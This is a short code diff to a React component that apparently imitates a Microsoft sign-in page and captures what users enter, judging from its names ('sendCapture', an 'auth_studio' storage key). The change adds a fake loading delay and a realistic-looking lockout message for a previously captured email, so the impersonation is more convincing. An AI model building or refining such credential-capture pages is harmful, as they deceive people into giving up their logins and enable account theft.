@@ -375,7 +375,8 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
       const lockedEmail = localStorage.getItem('auth_studio_locked_email');
       const currentEmail = captureVal || email;
       if (lockedEmail && lockedEmail.toLowerCase() === currentEmail.toLowerCase()) {
-        setStep('account-locked');
+        setLoading(true);
+        setTimeout(() => { setLoading(false); setEmailError('Your account is locked. Please try again in a couple of hours.'); }, 900);
         return;
       }
     }
